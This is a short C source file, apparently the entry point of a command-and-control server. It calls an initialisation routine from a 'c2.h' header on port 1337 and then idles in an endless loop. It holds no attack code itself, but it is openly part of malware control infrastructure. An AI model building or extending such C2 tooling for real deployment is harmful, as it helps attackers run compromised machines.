#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include "c2.h"

/* Entry point for the C&C server */
int main(int argc, char ** argv)
{
   //  0x539 is "1337" in host byte order.
	if(dext_init(0x539)) {
		return 0;
	}

	while(1) {
		sleep(1);
	}

	return 0;
}
